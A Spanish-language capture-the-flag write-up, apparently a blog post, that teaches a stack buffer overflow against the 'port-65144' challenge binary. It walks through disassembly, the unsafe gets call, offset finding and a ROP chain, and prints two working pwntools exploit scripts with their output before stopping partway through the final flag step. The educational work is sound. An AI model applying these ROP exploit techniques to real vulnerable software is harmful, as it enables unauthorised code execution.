# port-65144 write-up (Buffer Overflow)

Haré este articulo mas como una classe de buffer overflow, una vez que exiten varios trucos. Ojala que les gusten la lectura y que les sirvan para algo.

## Introdución

Bueno, estoy participando de un equipo de CTF llamado <a href="https://twitter.com/RATF_CTFTEAM" target="_blank">RATF</a>, en nuestro grupo de telegram privado, uno de los miembros compartió un <a href="https://twitter.com/joaovitormaiaa/status/1296209914801590272" target="_blank">desafio de XSS</a>, y esto me hizo pensar que podria hacer lo mismo, pero de una categoria distinta de CTF. ...

Vamos empezar con el tweet <a href="https://twitter.com/reisraff/status/1296237893741150210" target="_blank">https://twitter.com/reisraff/status/1296237893741150210</a>

<center><img src="post-assets/port-65144-tweet.png" width="611" alt="Tweet" /></center>

## Conociendo el binário

Aquí tenemos un enlace y el nombre del binario, así que descarguemos el binario:

```bash
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ wget  http://173.230.139.237/port-65144
--2020-08-31 14:44:46--  http://173.230.139.237/port-65144
Connecting to 173.230.139.237:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 13808 (13K)
Saving to: ‘port-65144’

port-65144           100%[====================================>]  13.48K  --.-KB/s    in 0s

2020-08-31 14:44:46 (95.8 MB/s) - ‘port-65144’ saved [13808/13808]

```

Haré una copia del <a href="post-assets/port-65144" target="_blank">binario aquí</a> si el enlace original no esté disponible.

### Análisis estático

Comandos básicos primero para conocer el binário

```bash
# md5sum
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ md5sum port-65144
aab94814547f2fbf3c36528fe52b071e  port-65144

# file command
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ file port-65144
port-65144: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),
dynamically linked, interpreter /lib/ld-linux.so.2,
BuildID[sha1]=dc5a9b5efbdeea355254ae0af173f75602c3873a, for GNU/Linux 3.2.0, stripped

```

Como podemos ver, tenemos un binario ELF de 32 bits que está estripado.

Comencemos con lo básico para comprender qué hace y cómo podemos gañarlo ;)

Me gusta comenzar ejecutando `strings` en el binario y hacer un dump en un archivo `.dump`:

```bash
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ strings port-65144 > port-65144.strings.txt
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ ls -l
total 40
-rwxr-xr-x 1 reisraff reisraff 13808 Aug 31 14:37 port-65144
-rw-r--r-- 1 reisraff reisraff   527 Aug 31 17:17 port-65144.strings.txt
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ head port-65144.strings.txt
td`
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
gets
exit
puts
printf
mmap
lseek
```

Ejecutando un `cat` en `port-65144.strings.txt`, podemos ver que hay algunas funciones libc que fueron exportadas como `put`, `printf`, `open` y también podemos ver que tiene `/code/ROP-me/flag.txt` que puede ser un archivo. Podemos adivinar que combinado con la función `open` podría imprimir la flag!?!?

Y ahora voy a hacer el dump:

```bash
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ objdump -dM intel port-65144 > port-65144.dump
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ ls -l
total 36
-rw-r--r-- 1 reisraff reisraff 13808 Aug 31 14:37 port-65144
-rw-r--r-- 1 reisraff reisraff 19822 Aug 31 15:21 port-65144.dump
-rw-r--r-- 1 reisraff reisraff   527 Aug 31 17:17 port-65144.strings.txt
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ head port-65144.dump

port-65144:     file format elf32-i386


Disassembly of section .init:

08049000 <.init>:
 8049000: f3 0f 1e fb           endbr32
 8049004: 53                    push   ebx
 8049005: 83 ec 08              sub    esp,0x8
reisraff@3dbbde46a935:~/workdir/challs/port-65144$

```

En el archivo `port-65144.dump`, el programa en sí está en la sección `<.text>`, por lo que es la única sección que es importante para nosotros ahora, pero como este binario está estripado, no podemos ver la separación por nombre de función. Sabiendo un poco sobre <a href="https://en.wikipedia.org/wiki/X86_calling_conventions" target="_blank">"convenciones de llamada" (calling conventions)</a>, sabemos que la declaración `ret` debe ser el final de las funciones, así que lo que hice para facilitar la lectura fue poner nuevas líneas después de cada `ret`. Quadando así:

```raw
08049140 <.text>:
 ...
 804916a: c7 c0 f2 93 04 08     mov    eax,0x80493f2
 8049170: 50                    push   eax
 8049171: e8 ba ff ff ff        call   8049130 <__libc_start_main@plt>
 8049176: f4                    hlt
 8049177: 8b 1c 24              mov    ebx,DWORD PTR [esp]
 804917a: c3                    ret


 804917b: 66 90                 xchg   ax,ax
 804917d: 66 90                 xchg   ax,ax
 804917f: 90                    nop
 8049180: f3 0f 1e fb           endbr32
 8049184: c3                    ret


 8049185: 66 90                 xchg   ax,ax
 8049187: 66 90                 xchg   ax,ax
 8049189: 66 90                 xchg   ax,ax
 804918b: 66 90                 xchg   ax,ax
 804918d: 66 90                 xchg   ax,ax
 804918f: 90                    nop
 8049190: 8b 1c 24              mov    ebx,DWORD PTR [esp]
 8049193: c3                    ret


 8049194: 66 90                 xchg   ax,ax
 8049196: 66 90                 xchg   ax,ax
 8049198: 66 90                 xchg   ax,ax
 ...
 ```

### Binário estripado

Un binario estripado es un binario que no tiene sus símbolos exportados, cuando digo símbolos, me refiero, por ejemplo, a los nombres de las funciones, es decir, `main`. Entonces, en esta condición, no podemos usar herramientas como gdb y hacer un breakpoint usando símbolos como:

```bash
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ gdb port-65144
...
Reading symbols from port-65144...
(No debugging symbols found in port-65144)
gef➤  break main
Function "main" not defined.
gef➤
```

### Función Main

Es una condición que podemos ignorar simplemente usando la dirección efectiva, pero ¿cómo puedo saber dónde está "main"?

Con gdb es simple, simplemente escriba `info files` y le dará el punto de entrada del programa:

```bash
gef➤  info files
Symbols from "/home/reisraff/workdir/challs/port-65144/port-65144".
Local exec file:
  `/home/reisraff/workdir/challs/port-65144/port-65144', file type elf32-i386.
  Entry point: 0x8049140
  0x080481b4 - 0x080481c7 is .interp
  0x080481c8 - 0x080481ec is .note.gnu.build-id
  0x080481ec - 0x08048208 is .note.gnu.property
  0x08048208 - 0x08048228 is .note.ABI-tag
  ...
```

El punto de entrada debería ser `0x8049140`, pero aún no es nuestra `main`, es un código que llamará a nuestra `main`. Bueno, en este caso, se trata simplemente de encontrar una secuencia de `mov eax, ???; push eax; call` después de este punto de entrada:

```raw
 804916a: c7 c0 f2 93 04 08     mov    eax,0x80493f2
 8049170: 50                    push   eax
 8049171: e8 ba ff ff ff        call   8049130 <__libc_start_main@plt>
```

Nuestra `main` debe estar en el address `0x80493f2` que se coloca en la stack como argumento de la función `__libc_start_main@plt` esta función preparará `argc`, `argv`, `env vars`, etc... para ser los argumentos de la `main`, y luego llamarla.

Bien, ahora que sabemos dónde está nuestra `main`, comencemos a analizar el código.

## Análisis de código

Nuestra `main` está llamando a dos funciones:

```raw
 80493f2: f3 0f 1e fb           endbr32
 80493f6: 8d 4c 24 04           lea    ecx,[esp+0x4]
 80493fa: 83 e4 f0              and    esp,0xfffffff0
 80493fd: ff 71 fc              push   DWORD PTR [ecx-0x4]
 8049400: 55                    push   ebp
 8049401: 89 e5                 mov    ebp,esp
 8049403: 53                    push   ebx
 8049404: 51                    push   ecx
 8049405: e8 86 fd ff ff        call   8049190 <__libc_start_main@plt+0x60>
 804940a: 81 c3 f6 2b 00 00     add    ebx,0x2bf6
 8049410: e8 9a ff ff ff        call   80493af <__libc_start_main@plt+0x27f>
```

Si miramos la primera llamada (`0x8049190`), podemos ver que solo está haciendo un `mov; ret` y no es lo que estamos buscando.

```raw
 8049190:  8b 1c 24              mov    ebx,DWORD PTR [esp]
 8049193:  c3                    ret
```

Pero al ver la segunda llamada (`0x80493af`), podemos ver que suceden más cosas:

```raw
 80493af: f3 0f 1e fb           endbr32
 80493b3: 55                    push   ebp
 80493b4: 89 e5                 mov    ebp,esp
 80493b6: 53                    push   ebx
 80493b7: 81 ec a4 00 00 00     sub    esp,0xa4
 80493bd: e8 ce fd ff ff        call   8049190 <__libc_start_main@plt+0x60>
 80493c2: 81 c3 3e 2c 00 00     add    ebx,0x2c3e
 80493c8: 83 ec 0c              sub    esp,0xc
 80493cb: 8d 83 3b e0 ff ff     lea    eax,[ebx-0x1fc5]
 80493d1: 50                    push   eax
 80493d2: e8 e9 fc ff ff        call   80490c0 <printf@plt>
 80493d7: 83 c4 10              add    esp,0x10
 80493da: 83 ec 0c              sub    esp,0xc
 80493dd: 8d 85 58 ff ff ff     lea    eax,[ebp-0xa8]
 80493e3: 50                    push   eax
 80493e4: e8 e7 fc ff ff        call   80490d0 <gets@plt>
 80493e9: 83 c4 10              add    esp,0x10
 80493ec: 90                    nop
 80493ed: 8b 5d fc              mov    ebx,DWORD PTR [ebp-0x4]
 80493f0: c9                    leave
 80493f1: c3                    ret
```

Ok, esta función es interesante porque hace uso de <a href="https://man7.org/linux/man-pages/man3/gets.3.html#BUGS" target="_blank">"gets"</a>, y cuando vemos esto, sabemos que conduce a un <a href="https://en.wikipedia.org/wiki/Buffer_overflow" target="_blank">"Buffer Overflow"</a>

## Buffer Overflow

Para comprender qué es esta vulnerabilidad y cómo aprovecharla, primero debemos comprender la `stack` y el `proceso`.

### Stack

La stack es uno de los segmentos de la memoria. Los `.data`, `.bss`, `heap` también son segmentos de memoria, pero por ahora veamos la stack.

La stack es un tipo de datos donde puede hacer `push` (que le agrega elementos) y `pop` (que elimina el elemento agregado más recientemente) y el orden en el que se ordenan las cosas nos da un nombre de LIFO (last in, first out). Una última cosa importante es que la pila crece al disminuir el número del address.

### Proceso

Todo lo que necesitamos saber para este desafío es que para que un programa funcione, tenemos que señalar una instrucción como `80493e4: e8 e7 fc ff ff call 80490d0 <gets@plt>` en una variable o mejor, un registrador que puede cambiar su identificador dependiendo de la arquitectura en la que se encuentre, en este caso estamos en i386, por lo que su identificador es `EIP`, también conocido como Instruction Pointer.

El valor contenido en el EIP aumenta después de todas las instrucciones apuntando a la siguiente instrucción, pero hay algunas instrucciones que cambian este comportamiento estableciendo el valor del EIP como las instrucciones `call` y` ret`, donde para la `call` su operando definirá el EIP, y `ret` tomará el address de la siguiente instrucción en la stack.


```raw
+++++++++++
higest addr
+==STACK==+
+++++++++++   Cuando ingresamos a una función, el proceso
+++++++++++  separe un espacio en la pila para colocar variables locales
+++++++++++
+++++++++++
+   EIP   +  EIP se guarda en la stack para fines de devolución
+   EBP   +  EBP es otro registrador, pero no es importante por ahora
+   VAR1  +  y aquí comienzan nuestras variables locales.
+   VAR2  +
+   VAR3  +  si esta variable se pasa a la función gets, podemos
+   ...   +  pisar todos los valores anteriores, como VAR2, VAR1, EBP y EIP
+   ...   +
+   ...   +
+   ...   +
+   ESP   +
+         +
+         +
+         +
+++++++++++
lowest addr
+++++++++++
```

Por qué se guarda EIP es simple, veamos este pequeño fragmento de código:

```raw
# aqui ok
 80493d1: 50                    push   eax

# aqui vamos cambiar el EIP de 0x80493d2 para 0x80490c0
#  despues que el printf hacer el `ret`, esto retorna
#  para el EIP guardado que es 0x80493d7 la proxima instrucción
 80493d2: e8 e9 fc ff ff        call   80490c0 <printf@plt>

 80493d7: 83 c4 10              add    esp,0x10
```


## Explorando

Ahora que conocemos los conceptos básicos, explorémoslo. Mirando el código de la función vulnerable, podemos ver que la variable que podemos aprovechar es:

```
 80493dd: 8d 85 58 ff ff ff     lea    eax,[ebp-0xa8]
 80493e3: 50                    push   eax
 80493e4: e8 e7 fc ff ff        call   80490d0 <gets@plt>
```

Sí, `ebp-0xa8`. `EBP` tendrá una dirección, sutraemos `0xa8` de esto y cargaremos su dirección efectiva => `lea` (load effective address) a `eax` y luego la enviaremos a la stack con `push` donde será el argumentos de la función `gets`.

Todas las variables tienen su propio tamaño, en este caso es fácil saber cuál es el tamaño de esta variable simplemente convirtiendo el `0xa8` en un decimal que es 168. Bien, con 168 bytes completamos la variable, ahora tenemos que reemplazar cosas en la stack hasta que obtengamos a EIP y tomemos el control del programa. El assembly ya nos ha dicho que tenemos `0xa8` bytes hasta llegar a `EBP` ok, en esta arquitectura este registrador tiene 4 bytes, así que agreguemos 4 a nuestro número y tenemos 172.

¿Vamos a probar?

```bash
# aquí vamos a agregar el permiso para ejecutar el programa
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ chmod +x port-65144

# aquí entendemos como debe ser la entrada que le daremos al programa
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ ./port-65144
Enter your buffer: asdf
not this time

# aquí enviamos nuestra carga con 172 caracteres "A" y 4 "B" y
# vemos que el mensaje cambia a "Segmentation fault (core dumped)"
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ echo $(python3 -c "print('A' * 172)")BBBB \
| ./port-65144
Segmentation fault (core dumped)

# y aquí podemos comprobar el segfault
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ dmesg | tail -n 1
[39206.428987] port-65144[5871]: segfault at 42424242 ip 0000000042424242
sp 00000000ffba4d50 error 14 in libc-2.30.so[f7dc5000+1d000]
```

Este último mensaje nos dice que el `IP` o` EIP` tenía el valor `0000000042424242` y el segfault estaba en esta dirección. Si vemos <a href="https://www.ascii-code.com/" target="_blank">tabla ASCII</a>, podemos confirmar que el número `0x42` (hexadecimal) es el mismo que "B", sabiendo esto, y recordando que enviamos 4 "B" si el IP es `0000000042424242` 4 entradas de 42 .... hmm .... lo hicimos! Podemos pisar el "EIP".

Ahora que tenemos eso, veamos qué podemos hacer con este binario:

```bash
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ checksec port-65144
[*] '/home/reisraff/workdir/challs/port-65144/port-65144'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
reisraff@3dbbde46a935:~/workdir/challs/port-65144$
```

No es tan fácil, tenemos algunas <a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow#Protection_schemes" target="_blank">propiedades de seguridad</a> habilitadas en este binario, el que lo hará más difícil es la <a href="https://en.wikipedia.org/wiki/NX_bit" target="_blank">NX</a> "no execute stack". Con eso, no podemos simplemente agregar código malicioso a nuestra carga y apuntar a su dirección, así que tenemos que leer el código un poco más, pero espera ... Recuerdo que teníamos algo como `flag.txt` y `open`, podemos apuntar a esa ubicación ...

Me encanta analizar el código con solo leer el assembly, pero ahora creo que es mejor explicarlo con <a href="https://ghidra-sre.org/" target="_blank">ghidra</a>.

<center><img src="post-assets/port-65144-ghidra-1.png" width="732" alt="ghidra" /></center>

Esta es la función que tiene la función `open`, vengo para está funcion imaginando que podríamos apuntar ahi y obtener la flag, pero como podemos ver, abre el archivo de la flag, sin embargo solo se imprime si pasan algunas condiciones, así que tenemos pensar un poco mas. Entendamos:

```raw
# la variable en el segmento de datos en el address 0x0804c035 debe ser diferente de 0
(DAT_0804c035 != 0)
# y la variable en el segmento de datos en el address 0x0804c036 debe ser diferente de 0
&& (DAT_0804c036 != 0)

# debe resolver verdadero, es decir:
# param_1 - int (DAT_0804c035) debe ser igual a int (DAT_0804c036)
&& param_1 - (uint)DAT_0804c035 == (uint)DAT_0804c036)
```

Dado que estas dos variables `0x0804c035` y `0x0804c035` están marcadas como `DAT`, creo que está en el segmento `.data`, pero confirmaremos por qué podría estar en el segmento `.bss`.

```bash
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ readelf -S port-65144 | grep 0804c
  [24] .got.plt          PROGBITS        0804c000 003000 00002c 04  WA  0   0  4
  [25] .data             PROGBITS        0804c02c 00302c 000008 00  WA  0   0  4
  [26] .bss              NOBITS          0804c034 003034 000004 00  WA  0   0  1
```

El segmento `.bss` comienza en `0x0804c034`, que es menor que `0x0804c035` y `0x0804c035`, por lo que estas 2 variables están en <a href="https://en.wikipedia.org/wiki/Data_segment#:~:text=The%20BSS%20segment%2C%20also%20known,explicit%20initialization%20in%20source%20code." target="_blank">.bss</a>

### .bss

El segmento `.bss` es donde están las variables globales no inicializadas o las variables globales inicializadas a 0 (cero)

¡Ahora solo tengo que encontrar en el código donde estas variables se cambian a 1 o verdaderas!

Mirando el código simplemente haciendo análisis estático, no pude hacerlo, así que decidí comenzar de nuevo, y recuerdo que vi "gotcha func1" y "gotcha func2", intenté encontrarlo simplemente haciendo un análisis estático pero NO, pero encontré 2 llamadas a la función `put` que puede imprimir estos 2 cosas.

<center><img src="post-assets/port-65144-ghidra-2.png" width="446" alt="ghidra" /></center>
<center><img src="post-assets/port-65144-ghidra-3.png" width="662" alt="ghidra" /></center>

Como ghidra no me está ayudando mucho, podría probar estas 2 funciones y ver qué imprime. Lo primero que necesitamos saber es el address de la función.
Bueno, ghidra está diciendo que la dirección de la primera función es `0x8049256` basada en el nombre de la función.

Esta función tiene 2 argumentos sabiendo que en 32 bits los argumentos van por la stack, es fácil. Puedo ver que el primer argumento debe ser igual a `0x9c` y el segundo `300`, así que hagamos un script `exploit.py`:

```python
#!/usr/bin/env python
import pwn

# pwn.context.log_level = 'debug'

f1 = pwn.p32(0x8049256)      # function address
f1arg1 = pwn.p32(0x9c)       # 1st argument
f1arg2 = pwn.p32(300)        # 2nd argument

buff = 'A' * 172             # our buffer with 172 A

"""
Now we put all together
buffer + function address + 'JUNK' + first argument + second argument
"""
payload = buff.encode() \
    + f1 \
    + 'JUNK'.encode() \
    + f1arg1 \
    + f1arg2

open('payload.txt', 'w').write(payload.decode('iso-8859-1'))

elf = pwn.ELF('./port-65144')
p = elf.process()
p.sendline(payload)

print('=========================')
print('what the process returned')
print(p.recv().decode())
```

Ok, este exploit vai nos devolver:

```bash
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ python3 exploit.py
[*] '/home/reisraff/workdir/challs/port-65144/port-65144'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process '/home/reisraff/workdir/challs/port-65144/port-65144': pid 976
=========================
what the process returned
Enter your buffer: gotcha func1

```

Estoy usando la <a href="https://pypi.org/project/pwntools/" target="_blank">librearia pwn</a> con python3.

Explicando el exploit, estoy enviando 172 bytes del carácter "A", reemplazando `EPI` con `f1` (function address), después de `EPI` tenemos `EBP`, que para nosotros no es importante ahora, así que puse `JUNK`, y tenemos nuestras variables locales, que en orden tenemos los valores `0x9c` y `300`.

También escribí un archivo llamado `payload.txt` para depurarlo con `gdb` más tarde.

Pondré un punto de interrupción en la dirección `0x804927d` porque creo que está cambiando una variable importante ya conocida.

```bash
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ gdb port-65144
Reading symbols from port-65144...
(No debugging symbols found in port-65144)
gef➤  break *0x804927d
gef➤  run < payload.txt
```

¿Recuerda la variable en `.bss`? su address es `0x0804c035`, así que acabo de imprimir antes de ejecutar el punto de interrupción:

```bash
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────── registers ────
$eax   : 0x0804c000  →  0x0804bf14  →  0x00000001
$ebx   : 0x41414141 ("AAAA"?)
$ecx   : 0xf7f0d580  →  0xfbad2088
$edx   : 0xff8e788c  →  0xf7d4be00  →  <__libc_start_main+0> call 0xf7e6c009
$esp   : 0xff8e7874  →  0x41414141 ("AAAA"?)
$ebp   : 0xff8e787c  →  0x41414141 ("AAAA"?)
$esi   : 0xf7f0d000  →  0x001dfd6c
$edi   : 0xf7f0d000  →  0x001dfd6c
$eip   : 0x0804927d  →   mov BYTE PTR [eax+0x35], 0x1
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow
  resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
─────────────────────────────────────────────────────────────────── stack ────
0xff8e7874│+0x0000: 0x41414141   ← $esp
0xff8e7878│+0x0004: 0x41414141
0xff8e787c│+0x0008: 0x41414141   ← $ebp
0xff8e7880│+0x000c: 0x42424242
0xff8e7884│+0x0010: 0x0000009c
0xff8e7888│+0x0014: 0x0000012c
0xff8e788c│+0x0018: 0xf7d4be00  →  <__libc_start_main+0> call 0xf7e6c009
0xff8e7890│+0x001c: 0xf7f0d000  →  0x001dfd6c
───────────────────────────────────────────────────────────── code:x86:32 ────
    0x804926d                  or     BYTE PTR [eax+eax*1+0x24750000], bl
    0x8049274                  cmp    DWORD PTR [ebp+0xc], 0x12c
    0x804927b                  jne    0x8049298
 →  0x804927d                  mov    BYTE PTR [eax+0x35], 0x1
    0x8049284                  sub    esp, 0xc
    0x8049287                  lea    edx, [eax-0x1ff8]
    0x804928d                  push   edx
    0x804928e                  mov    ebx, eax
    0x8049290                  call   0x80490f0 <puts@plt>
───────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "port-65144", stopped 0x804927d in ?? (), reason: SINGLE STEP
─────────────────────────────────────────────────────────────────── trace ────
[#0] 0x804927d → mov BYTE PTR [eax+0x35], 0x1
──────────────────────────────────────────────────────────────────────────────
gef➤  x/x 0x0804c035
0x804c035:  0x00000000
```

Sí, es 0 (cero), ¡así que ejecutemos la siguiente instrucción y comprobemos nuevamente!

```bash
gef➤  ni
0x08049284 in ?? ()


[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────── registers ────
$eax   : 0x0804c000  →  0x0804bf14  →  0x00000001
$ebx   : 0x41414141 ("AAAA"?)
$ecx   : 0xf7f0d580  →  0xfbad2088
$edx   : 0xff8e788c  →  0xf7d4be00  →  <__libc_start_main+0> call 0xf7e6c009
$esp   : 0xff8e7874  →  0x41414141 ("AAAA"?)
$ebp   : 0xff8e787c  →  0x41414141 ("AAAA"?)
$esi   : 0xf7f0d000  →  0x001dfd6c
$edi   : 0xf7f0d000  →  0x001dfd6c
$eip   : 0x08049284  →   sub esp, 0xc
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow
  resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
─────────────────────────────────────────────────────────────────── stack ────
0xff8e7874│+0x0000: 0x41414141   ← $esp
0xff8e7878│+0x0004: 0x41414141
0xff8e787c│+0x0008: 0x41414141   ← $ebp
0xff8e7880│+0x000c: 0x42424242
0xff8e7884│+0x0010: 0x0000009c
0xff8e7888│+0x0014: 0x0000012c
0xff8e788c│+0x0018: 0xf7d4be00  →  <__libc_start_main+0> call 0xf7e6c009
0xff8e7890│+0x001c: 0xf7f0d000  →  0x001dfd6c
───────────────────────────────────────────────────────────── code:x86:32 ────
    0x8049274                  cmp    DWORD PTR [ebp+0xc], 0x12c
    0x804927b                  jne    0x8049298
    0x804927d                  mov    BYTE PTR [eax+0x35], 0x1
 →  0x8049284                  sub    esp, 0xc
    0x8049287                  lea    edx, [eax-0x1ff8]
    0x804928d                  push   edx
    0x804928e                  mov    ebx, eax
    0x8049290                  call   0x80490f0 <puts@plt>
    0x8049295                  add    esp, 0x10
───────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "port-65144", stopped 0x8049284 in ?? (), reason: SINGLE STEP
─────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8049284 → sub esp, 0xc
──────────────────────────────────────────────────────────────────────────────
gef➤  x/x 0x0804c035
0x804c035:  0x00000001
```

Como dice el texto "Gotcha func1". Podemos ver que esta función cambia el valor de la variable en `.bss` lo cual es importante para más adelante. Ahora creo que podemos hacer lo mismo con "gotcha func2", pero ahora tenemos que usar algo llamado gadgets.

### Gadgets

Los gadgets son instrucciones que nos ayudan a controlar el flujo del programa, en este caso necesitamos un gadget que realice un `pop; pop; ret; `¿por qué?

Nuestra stack se ve así en este momento:

```raw
+++++++++++
higest addr
+==STACK==+
+++++++++++
+++++++++++
+++++++++++
+++++++++++
+         +
+         +
+         +   300                         FUNCTION 1 ARG2
+         +   0x9c                        FUNCTION 1 ARG1
+         +   JUNK                        JUNK FOR NOW
+   EIP   +   0x8049256                   FUNCTION 1 ADDREESS
+   EBP   +   AAAA                        EBP
+   VAR1  +   AAAAAAAAAAAAAAAAAAA...      BUFFER
+         +
+         +
+   ...   +
+   ...   +
+   ...   +
+   ESP   +
+         +
+++++++++++
lowest addr
+++++++++++
```

Bien, cuando la función 1 retorne, donde ponemos `JUNK` será nuestro próximo `EIP`, pero como tenemos que pasar argumentos a la siguiente función, necesitamos que el gadget elimine los argumentos actuales de la stack para dejar espacio para el próximo `EIP` y los argumentos. Entonces tenemos que eliminar arg1 y arg2.

Recordemos cómo se ve la segunda función y cómo obtenemos el gadget.

<center><img src="post-assets/port-65144-ghidra-3.png" width="662" alt="ghidra" /></center>

Esta función toma 3 argumentos y los valores deben ser 1er argumento = `0` (cero), 2do y 3er argumentos = `0xd`

Para ayudarnos, instalaré <a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank">ROPGadget</a> que nos mostrará qué gadgets están disponibles.

```bash
reisraff@3dbbde46a935:.../port-65144$ python3 ROPgadget/ROPgadget.py --binary port-65144 | grep pop
0x080494cd : add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
0x0804949d : add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0804901f : add esp, 8 ; pop ebx ; ret
0x0804942e : clc ; pop ecx ; pop ebx ; pop ebp ; lea esp, [ecx - 4] ; ret
0x08049294 : inc dword ptr [ebx - 0x746fef3c] ; pop ebp ; cld ; leave ; ret
0x0804949c : jecxz 0x8049429 ; les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0x0804949b : jne 0x8049489 ; add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0804942c : lea esp, [ebp - 8] ; pop ecx ; pop ebx ; pop ebp ; lea esp, [ecx - 4] ; ret
0x08049020 : les ecx, ptr [eax] ; pop ebx ; ret
0x0804949e : les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0x0804949f : or al, 0x5b ; pop esi ; pop edi ; pop ebp ; ret
0x0804929a : pop ebp ; cld ; leave ; ret
0x08049431 : pop ebp ; lea esp, [ecx - 4] ; ret
0x080494a3 : pop ebp ; ret
0x08049430 : pop ebx ; pop ebp ; lea esp, [ecx - 4] ; ret
0x080494a0 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08049022 : pop ebx ; ret
0x0804942f : pop ecx ; pop ebx ; pop ebp ; lea esp, [ecx - 4] ; ret
0x080494a2 : pop edi ; pop ebp ; ret
0x080494a1 : pop esi ; pop edi ; pop ebp ; ret
0x08049433 : popal ; cld ; ret
0x0804901a : sal byte ptr [edx + eax - 1], 0xd0 ; add esp, 8 ; pop ebx ; ret
reisraff@3dbbde46a935:~/workdir/challs/port-65144$
```

Los de arriba son gadgets, y hago grep para `pop` que es lo que necesitamos, puedo ver que tenemos un `pop; popular; ret;` en el address `0x080494a2`, así que actualizaré mi exploit así:

```python
#!/usr/bin/env python
import pwn

# pwn.context.log_level = 'debug'

poppopret = pwn.p32(0x080494a2)  # gadgets try ROPgadget

f1 = pwn.p32(0x8049256)     # func1 address
f1arg1 = pwn.p32(0x9c)      # 1st argument of func1
f1arg2 = pwn.p32(300)       # 2nd argument of func1

f2 = pwn.p32(0x804929e)     # func2 address
f2arg1 = pwn.p32(0x0)       # 1st argument of func2
f2arg2 = pwn.p32(0xd)       # 2nd argument of func2
f2arg3 = pwn.p32(0xd)       # 3rd argument of func2

buff = 'A' * 172             # our buffer with 172 A

"""
Now we put all together
buffer + func1 address + poppopret + 1st arg f1 + 2nd arg f1
+ func2 address + JUNK + 1st arg f2 + 2nd arg f2 + 3rd arg f2
"""
payload = buff.encode() \
    + f1 \
    + poppopret \
    + f1arg1 \
    + f1arg2 \
    + f2 \
    + 'JUNK'.encode() \
    + f2arg1 \
    + f2arg2 \
    + f2arg3

open('payload.txt', 'w').write(payload.decode('iso-8859-1'))

elf = pwn.ELF('./port-65144')
p = elf.process()
p.sendline(payload)

print('=========================')
print('what the process returned')
print(p.recv().decode())
```

Y eso nos devuelve:

```
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ python3 exploit.py
[*] '/home/reisraff/workdir/challs/port-65144/port-65144'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process '/home/reisraff/workdir/challs/port-65144/port-65144': pid 2347
=========================
what the process returned
Enter your buffer: gotcha func1
gotcha func2
```

Podría suponer que function2 tiene el mismo comportamiento que cambiar el valor de la variable en `.bss` debido a esta declaración:

```raw
80492d7:  c6 80 36 00 00 00 01  mov    BYTE PTR [eax+0x36],0x1
```

Y finalmente hacemos lo mismo para la función que tiene `open` con `/code/ROP-me/flag.txt`, pero para que este próximo paso funcione tenemos que tener este archivo con la ruta exacta en nuestra máquina, entonces crearé:

```raw
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ sudo mkdir -p /code/ROP-me/
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ echo "FLAG TEST" | sudo tee /code/ROP-me/flag.txt
FLAG TEST
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ cat /code/ROP-me/flag.txt
FLAG TEST
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ sudo chmod 777 -R /code
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ ls /code/ROP-me/flag.txt  -l
-rwxrwxrwx 1 root root 10 Aug 31 22:08 /code/ROP-me/flag.txt
```

Ahora pasamos al siguiente paso, recordemos cómo era la función:

<center><img src="post-assets/port-65144-ghidra-1.png" width="732" alt="ghidra" /></center>

Bien, las dos primeras condiciones creo que pasarán, y la última depende del valor de param1, que debe ser un valor que, sustraendo `0x01` de esto, debe ser igual a `0x01`. Por qué `0x01` porque acabo de imprimir:

```
gef➤  x/x 0x0804c035
0x804c035:  0x00000001
```

